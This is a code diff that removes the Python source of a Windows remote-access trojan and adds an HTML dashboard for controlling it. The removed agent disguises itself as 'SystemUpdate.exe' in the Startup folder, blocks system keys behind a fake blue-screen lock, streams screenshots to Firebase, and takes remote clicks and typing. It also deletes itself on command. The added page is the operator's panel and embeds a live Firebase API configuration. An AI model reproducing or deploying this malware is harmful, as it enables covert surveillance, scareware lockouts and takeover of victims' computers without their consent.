@@ -1,224 +1,246 @@
-import firebase_admin
-from firebase_admin import credentials, db
-import tkinter as tk
-import threading
-import time
-import queue
-import keyboard
-import pyautogui
-import base64
-import os
-import sys
-import shutil
-import subprocess
-import uuid
-from io import BytesIO
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Device Control Center</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background: #0b0f1a; color: #e2e8f0; }
+        .glass { background: rgba(17, 25, 40, 0.75); backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .device-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .device-card:hover { transform: translateY(-4px); border-color: #3b82f6; }
+        #live-viewport { 
+            cursor: crosshair;
+            image-rendering: pixelated;
+        }
+    </style>
+</head>
+<body class="p-6">
 
-# --- Configuration & Identity ---
-def get_device_id():
-    """Har computer ke liye unique ID generate karein motherboard/node ke base par"""
-    return str(uuid.getnode())
+    <div class="max-w-[1600px] mx-auto">
+        <header class="flex justify-between items-center mb-8">
+            <div>
+                <h1 class="text-3xl font-black tracking-tighter text-white">SYSTEM<span class="text-blue-500">X</span> CONTROL</h1>
+                <p class="text-slate-500 text-sm">Managing <span id="device-count" class="text-blue-400 font-bold">0</span> Active Nodes</p>
+            </div>
+            <div id="global-status" class="px-4 py-2 rounded-full glass text-[10px] font-bold flex items-center gap-2">
+                <div class="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
+                FIREBASE LIVE
+            </div>
+        </header>
 
-DEVICE_ID = get_device_id()
-APP_PATH = os.path.realpath(sys.argv[0])
-
-# Firebase Initialization
-try:
-    cred = credentials.Certificate('serviceAccountKey.json')
-    firebase_admin.initialize_app(cred, {
-        'databaseURL': 'https://smsyy-f7bb7-default-rtdb.firebaseio.com'
-    })
-    print(f"Device ID: {DEVICE_ID} - Remote Controller Started...")
-except Exception as e:
-    print(f"Firebase Error: {e}")
-    exit()
-
-class RemoteLocker:
-    def __init__(self):
-        self.root = None
-        self.is_locked = False
-        self.is_streaming = False
-        self.cmd_queue = queue.Queue()
-        self.screen_width, self.screen_height = pyautogui.size()
-        self.blocked_keys = ['windows', 'alt', 'tab', 'esc', 'ctrl', 'delete', 'f4']
-        self.start_time = 0
-        self.lock_duration = 600 # 10 minutes progress for BSOD
-        
-        # Paths for Persistence (Startup)
-        self.startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-        self.target_exe = os.path.join(self.startup_folder, "SystemUpdate.exe")
-
-    def _add_to_startup(self):
-        """Khud ko startup folder mein copy karein (exe version compatible)"""
-        try:
-            if not os.path.exists(self.target_exe):
-                shutil.copy2(APP_PATH, self.target_exe)
-        except:
-            pass
-
-    def _ping_status(self):
-        """Dashboard par live presence aur hostname bhejte rahein"""
-        while True:
-            try:
-                db.reference(f'devices/{DEVICE_ID}/status').set({
-                    'last_seen': time.time(),
-                    'online': True,
-                    'hostname': os.getenv('COMPUTERNAME', 'Unknown-PC')
-                })
-            except: pass
-            time.sleep(5)
-
-    def _self_destruct(self):
-        """Agent ko system se poori tarah delete karke exit karein"""
-        try:
-            if os.path.exists(self.target_exe):
-                os.remove(self.target_exe)
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
             
-            # Script ko delete karne ke liye temporary batch file
-            batch_path = os.path.join(os.getenv('TEMP'), "cleanup.bat")
-            with open(batch_path, "w") as f:
-                f.write(f'timeout /t 3 /nobreak > nul\ndel /f /q "{APP_PATH}"\ndel "%~f0"')
-            
-            subprocess.Popen(batch_path, shell=True)
-            os._exit(0)
-        except:
-            os._exit(0)
+            <!-- Device Selection Sidebar -->
+            <div class="lg:col-span-3 space-y-4 overflow-y-auto max-h-[80vh] pr-2" id="device-list">
+                <div class="text-center py-20 opacity-20 italic text-sm">Waiting for devices to ping...</div>
+            </div>
 
-    def _capture_screen_optimized(self):
-        """Zero flicker screen capture strategy"""
-        try:
-            if not self.root: return
-            if self.is_locked:
-                # Topmost ko momentarily disable karke capture karein
-                self.root.attributes("-topmost", False)
-                self.root.lower()
-                time.sleep(0.01)
-            
-            screenshot = pyautogui.screenshot()
-            
-            if self.is_locked:
-                self.root.attributes("-topmost", True)
-                self.root.lift()
-            
-            buffered = BytesIO()
-            screenshot.save(buffered, format="JPEG", quality=30)
-            img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
-            db.reference(f'devices/{DEVICE_ID}/last_screenshot').set(f"data:image/jpeg;base64,{img_str}")
-        except Exception as e:
-            print(f"Capture Error: {e}")
+            <!-- Control Dashboard -->
+            <div class="lg:col-span-9 space-y-6">
+                <div id="no-selection" class="glass rounded-3xl h-[60vh] flex flex-col items-center justify-center border-dashed border-2 border-white/5">
+                    <div class="w-16 h-16 bg-blue-500/10 rounded-full flex items-center justify-center mb-4">
+                        <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
+                    </div>
+                    <h2 class="text-lg font-bold text-white">Select a Node</h2>
+                    <p class="text-slate-500 text-xs">Choose a device from the sidebar to begin remote session.</p>
+                </div>
 
-    def _stream_loop(self):
-        while True:
-            if self.is_streaming:
-                self._capture_screen_optimized()
-            time.sleep(1.5)
+                <div id="main-controls" class="hidden space-y-6">
+                    <!-- Info Header -->
+                    <div class="glass p-4 rounded-2xl flex justify-between items-center">
+                        <div class="flex items-center gap-4">
+                            <span id="active-hostname" class="font-bold text-white uppercase tracking-tight">HOSTNAME</span>
+                            <span id="active-id" class="text-[9px] bg-white/5 px-2 py-1 rounded font-mono text-slate-400 tracking-widest uppercase">ID: ----</span>
+                        </div>
+                        <button onclick="sendDestruct()" class="px-4 py-2 bg-red-600/10 hover:bg-red-600 text-red-500 hover:text-white rounded-lg text-[10px] font-bold transition-all border border-red-500/20">FORCE SELF-DESTRUCT</button>
+                    </div>
 
-    def process_queue(self):
-        try:
-            while True:
-                msg = self.cmd_queue.get_nowait()
-                m_type = msg.get('type')
+                    <div class="grid grid-cols-1 xl:grid-cols-4 gap-6">
+                        <!-- Viewport -->
+                        <div class="xl:col-span-3">
+                            <div class="glass p-2 rounded-3xl overflow-hidden relative">
+                                <div class="absolute top-6 left-6 z-10 flex items-center gap-2">
+                                    <div id="live-indicator" class="w-2 h-2 bg-red-500 rounded-full hidden animate-pulse"></div>
+                                    <span id="status-tag" class="text-[9px] font-bold text-white/40 uppercase tracking-widest">Feed Disabled</span>
+                                </div>
+                                <div class="bg-black rounded-2xl aspect-video flex items-center justify-center overflow-hidden">
+                                    <img id="live-viewport" src="" class="max-w-full max-h-full hidden" onmousedown="clickScreen(event)" draggable="false">
+                                    <div id="loader" class="text-slate-700 flex flex-col items-center">
+                                        <div class="w-8 h-8 border-2 border-white/5 border-t-blue-500 rounded-full animate-spin mb-4"></div>
+                                        <span class="text-[9px] font-bold tracking-[0.2em] uppercase">Initializing Feed</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Side Tools -->
+                        <div class="space-y-4">
+                            <div class="glass p-5 rounded-3xl">
+                                <h3 class="text-[10px] font-bold text-slate-500 mb-4 uppercase tracking-widest">Main Actions</h3>
+                                <div class="grid grid-cols-2 gap-2 mb-4">
+                                    <button onclick="toggleCommand('lock')" id="lock-btn" class="py-3 bg-slate-800 hover:bg-red-600 rounded-xl text-[10px] font-bold transition-all">LOCK SYSTEM</button>
+                                    <button onclick="toggleCommand('stream')" id="stream-btn" class="py-3 bg-slate-800 hover:bg-blue-600 rounded-xl text-[10px] font-bold transition-all">STREAM FEED</button>
+                                </div>
+                                <div class="space-y-2">
+                                    <input type="text" id="typing-box" placeholder="Remote type..." class="w-full bg-black/40 border border-white/5 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500/50">
+                                    <div class="flex gap-2">
+                                        <button onclick="remoteType()" class="flex-1 bg-blue-600 py-3 rounded-xl font-bold text-[10px] uppercase">Send String</button>
+                                        <button onclick="sendKey('ENTER')" class="px-4 bg-white/5 rounded-xl hover:bg-white/10 transition-colors">↵</button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="glass p-5 rounded-3xl">
+                                <h3 class="text-[10px] font-bold text-slate-500 mb-4 uppercase tracking-widest">Hotkeys</h3>
+                                <div class="grid grid-cols-3 gap-2">
+                                    <button onclick="sendKey('WIN')" class="p-2 bg-white/5 hover:bg-white/10 rounded-lg text-[10px] font-bold">WIN</button>
+                                    <button onclick="sendKey('ESC')" class="p-2 bg-white/5 hover:bg-white/10 rounded-lg text-[10px] font-bold">ESC</button>
+                                    <button onclick="sendKey('F4')" class="p-2 bg-white/5 hover:bg-white/10 rounded-lg text-[10px] font-bold">F4</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Replace with your Firebase credentials
+        const firebaseConfig = {
+            apiKey: "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
+            authDomain: "smsyy-f7bb7.firebaseapp.com",
+            databaseURL: "https://smsyy-f7bb7-default-rtdb.firebaseio.com",
+            projectId: "smsyy-f7bb7",
+            storageBucket: "smsyy-f7bb7.firebasestorage.app",
+            messagingSenderId: "199149027655",
+            appId: "1:199149027655:web:2d9e70e7dff7abc293cc62"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let selectedId = null;
+
+        // Auto-refresh Device List
+        db.ref('devices').on('value', (snap) => {
+            const devices = snap.val() || {};
+            const list = document.getElementById('device-list');
+            list.innerHTML = '';
+            
+            let count = 0;
+            Object.keys(devices).forEach(id => {
+                count++;
+                const dev = devices[id];
+                const isOnline = (Date.now() / 1000) - dev.status?.last_seen < 15;
                 
-                if m_type == 'lock':
-                    if msg['val']: self._show_bsod()
-                    else: self._hide_bsod()
-                elif m_type == 'stream':
-                    self.is_streaming = msg['val']
-                elif m_type == 'mouse':
-                    tx, ty = int(msg['x'] * self.screen_width), int(msg['y'] * self.screen_height)
-                    if self.is_locked:
-                        self.root.attributes("-alpha", 0.0)
-                        pyautogui.click(tx, ty)
-                        self.root.attributes("-alpha", 1.0)
-                    else:
-                        pyautogui.click(tx, ty)
-                elif m_type == 'type_text':
-                    text = msg['text']
-                    if text and text.startswith("{KEY:"):
-                        key = text.replace("{KEY:", "").replace("}", "").lower()
-                        pyautogui.press(key)
-                    elif text:
-                        pyautogui.write(text, interval=0.01)
-                elif m_type == 'destruct':
-                    self._self_destruct()
-        except queue.Empty:
-            pass
-        
-        if self.is_locked: self._update_progress()
-        if self.root: self.root.after(30, self.process_queue)
+                const el = document.createElement('div');
+                el.className = `device-card glass p-4 rounded-2xl cursor-pointer ${selectedId === id ? 'border-blue-500 bg-blue-500/10' : ''}`;
+                el.onclick = () => selectNode(id, dev.status?.hostname);
+                
+                el.innerHTML = `
+                    <div class="flex items-center gap-3">
+                        <div class="w-2.5 h-2.5 rounded-full ${isOnline ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]' : 'bg-slate-700'}"></div>
+                        <div class="flex-1">
+                            <h4 class="font-bold text-xs text-white">${dev.status?.hostname || 'Node-X'}</h4>
+                            <p class="text-[9px] font-mono text-slate-500">${id}</p>
+                        </div>
+                        ${dev.commands?.lock ? '<div class="w-1.5 h-1.5 rounded-full bg-red-500"></div>' : ''}
+                    </div>
+                `;
+                list.appendChild(el);
+            });
+            document.getElementById('device-count').innerText = count;
 
-    def _update_progress(self):
-        elapsed = time.time() - self.start_time
-        percent = int((elapsed / self.lock_duration) * 100)
-        if percent > 100: percent = 100
-        if hasattr(self, 'perc_label'):
-            self.perc_label.config(text=f"{percent}% complete")
+            if(selectedId && devices[selectedId]) {
+                syncUI(devices[selectedId]);
+            }
+        });
 
-    def _show_bsod(self):
-        if self.is_locked: return
-        self.is_locked = True
-        self.start_time = time.time()
-        for key in self.blocked_keys:
-            try: keyboard.block_key(key)
-            except: pass
-        
-        self.root.deiconify()
-        self.root.attributes("-fullscreen", True, "-topmost", True, "-alpha", 1.0)
-        bsod_color = '#0078D7'
-        self.root.configure(background=bsod_color)
-        self.root.overrideredirect(True)
-        
-        for widget in self.root.winfo_children(): widget.destroy()
-        
-        # Real Windows 11 BSOD Layout
-        f = tk.Frame(self.root, bg=bsod_color)
-        f.place(relx=0.1, rely=0.15, relwidth=0.8, relheight=0.7)
-        
-        tk.Label(f, text=":(", fg="white", bg=bsod_color, font=("Segoe UI Light", 120)).pack(anchor='w', pady=(0, 10))
-        msg = "Your PC ran into a problem and needs to restart. We're just\ncollecting some error info, and then we'll restart for you."
-        tk.Label(f, text=msg, fg="white", bg=bsod_color, font=("Segoe UI", 26), justify="left").pack(anchor='w', pady=(0, 15))
-        
-        self.perc_label = tk.Label(f, text="0% complete", fg="white", bg=bsod_color, font=("Segoe UI", 26))
-        self.perc_label.pack(anchor='w', pady=(0, 40))
-        
-        footer = tk.Frame(f, bg=bsod_color)
-        footer.pack(anchor='w', side="bottom", pady=20)
-        
-        tk.Label(footer, text="For more information about this issue and possible fixes, visit https://www.windows.com/stopcode", 
-                 fg="white", bg=bsod_color, font=("Segoe UI", 12)).pack(anchor='w')
-        tk.Label(footer, text="If you call a support person, give them this info:", fg="white", bg=bsod_color, font=("Segoe UI", 12)).pack(anchor='w', pady=(10,0))
-        tk.Label(footer, text="Stop code: CRITICAL_PROCESS_DIED", fg="white", bg=bsod_color, font=("Segoe UI", 12, "bold")).pack(anchor='w')
+        function selectNode(id, name) {
+            selectedId = id;
+            document.getElementById('no-selection').classList.add('hidden');
+            document.getElementById('main-controls').classList.remove('hidden');
+            document.getElementById('active-hostname').innerText = name || 'UNKNOWN';
+            document.getElementById('active-id').innerText = `ID: ${id}`;
+        }
 
-        self.root.config(cursor="none")
-        self.root.focus_force()
+        function syncUI(data) {
+            const lockBtn = document.getElementById('lock-btn');
+            const streamBtn = document.getElementById('stream-btn');
+            
+            // Sync Lock Status
+            if(data.commands?.lock) {
+                lockBtn.innerText = "UNBLOCK PC";
+                lockBtn.classList.replace('bg-slate-800', 'bg-red-600');
+            } else {
+                lockBtn.innerText = "LOCK SYSTEM";
+                lockBtn.classList.replace('bg-red-600', 'bg-slate-800');
+            }
 
-    def _hide_bsod(self):
-        if not self.is_locked: return
-        self.is_locked = False
-        keyboard.unhook_all()
-        self.root.withdraw()
-        self.root.config(cursor="")
+            // Sync Stream Status
+            if(data.commands?.stream) {
+                streamBtn.innerText = "STREAM LIVE";
+                streamBtn.classList.replace('bg-slate-800', 'bg-blue-600');
+                document.getElementById('live-indicator').classList.remove('hidden');
+                document.getElementById('status-tag').innerText = "LIVE FEED";
+                document.getElementById('status-tag').classList.replace('text-white/40', 'text-blue-400');
+            } else {
+                streamBtn.innerText = "STREAM FEED";
+                streamBtn.classList.replace('bg-blue-600', 'bg-slate-800');
+                document.getElementById('live-indicator').classList.add('hidden');
+                document.getElementById('status-tag').innerText = "Feed Disabled";
+                document.getElementById('status-tag').classList.replace('text-blue-400', 'text-white/40');
+            }
 
-    def start(self):
-        self._add_to_startup()
-        self.root = tk.Tk()
-        self.root.withdraw()
-        threading.Thread(target=self._stream_loop, daemon=True).start()
-        threading.Thread(target=self._ping_status, daemon=True).start()
-        self.process_queue()
-        self.root.mainloop()
+            // Update Image
+            if(data.last_screenshot) {
+                const img = document.getElementById('live-viewport');
+                img.src = data.last_screenshot;
+                img.classList.remove('hidden');
+                document.getElementById('loader').classList.add('hidden');
+            }
+        }
 
-# Listeners for specific DeviceID path
-locker = RemoteLocker()
-device_ref = db.reference(f'devices/{DEVICE_ID}/commands')
+        function toggleCommand(cmd) {
+            if(!selectedId) return;
+            const ref = db.ref(`devices/${selectedId}/commands/${cmd}`);
+            ref.once('value', s => ref.set(!s.val()));
+        }
 
-def setup_listeners():
-    device_ref.child('lock').on_value(lambda e: locker.cmd_queue.put({'type': 'lock', 'val': e.data}) if e.data is not None else None)
-    device_ref.child('stream').on_value(lambda e: locker.cmd_queue.put({'type': 'stream', 'val': e.data}) if e.data is not None else None)
-    device_ref.child('mouse').on_value(lambda e: locker.cmd_queue.put({'type': 'mouse', 'x': e.data['x'], 'y': e.data['y']}) if e.data else None)
-    device_ref.child('typing').on_value(lambda e: locker.cmd_queue.put({'type': 'type_text', 'text': e.data}) if e.data else None)
-    device_ref.child('destruct').on_value(lambda e: locker.cmd_queue.put({'type': 'destruct'}) if e.data is True else None)
+        function remoteType() {
+            if(!selectedId) return;
+            const val = document.getElementById('typing-box').value;
+            db.ref(`devices/${selectedId}/commands/typing`).set(val);
+            document.getElementById('typing-box').value = "";
+            setTimeout(() => db.ref(`devices/${selectedId}/commands/typing`).set(""), 300);
+        }
 
-if __name__ == "__main__":
-    setup_listeners()
-    locker.start()
+        function sendKey(key) {
+            if(!selectedId) return;
+            db.ref(`devices/${selectedId}/commands/typing`).set(`{KEY:${key}}`);
+            setTimeout(() => db.ref(`devices/${selectedId}/commands/typing`).set(""), 300);
+        }
+
+        function clickScreen(e) {
+            if(!selectedId) return;
+            const img = document.getElementById('live-viewport');
+            const rect = img.getBoundingClientRect();
+            const x = (e.clientX - rect.left) / rect.width;
+            const y = (e.clientY - rect.top) / rect.height;
+            db.ref(`devices/${selectedId}/commands/mouse`).set({ x, y, ts: Date.now() });
+        }
+
+        function sendDestruct() {
+            if(!selectedId) return;
+            if(confirm("DANGER: This will delete the software from target PC permanently. Continue?")) {
+                db.ref(`devices/${selectedId}/commands/destruct`).set(true);
+            }
+        }
+    </script>
+</body>
+</html>
